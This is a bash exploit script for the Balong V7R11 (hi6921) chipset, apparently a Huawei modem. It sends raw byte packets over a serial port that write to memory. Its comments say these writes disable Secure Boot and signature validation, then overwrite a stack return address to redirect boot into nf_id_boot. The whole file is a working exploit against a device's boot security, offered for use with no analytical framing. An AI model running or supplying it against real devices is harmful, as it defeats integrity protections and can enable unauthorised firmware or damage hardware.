#!/bin/bash
# This exploit disables SecuBoot and should_validate and starts nf_id_boot on Balong V7R11 (hi6921).

set -e

if ! [[ "$1" ]]; then echo "$0 <port device>" && exit 1; fi
PORT="$1"

# Configure port
#stty -F "$PORT" raw 115200 -echo -echoe -echok
stty -F "$PORT" raw -echo -echoe -echok

# Disable Secure Boot (write 2x 0x00000000 to 0x4FE1FFEC)
echo -ne "\xFE\x00\xFF\x01\x00\x00\x00\x08\x4F\xE1\xFF\xEC\xA8\xA3" > "$PORT"
sleep 0.2
echo -ne "\xDA\x01\xFE\x00\x00\x00\x00\x00\x00\x00\x00\x92\x24" > "$PORT"
sleep 0.2

# Restart to nf_id_boot (write 0x901406B5 to 0x4FE1E300, the most bottom return function of the stack)
echo -ne "\xFE\x00\xFF\x01\x00\x00\x00\x04\x4F\xE1\xE3\x00\x59\x34" > "$PORT"
sleep 0.2
echo -ne "\xDA\x01\xFE\xB5\x06\x14\x90\xB4\x44" > "$PORT"
sleep 0.2
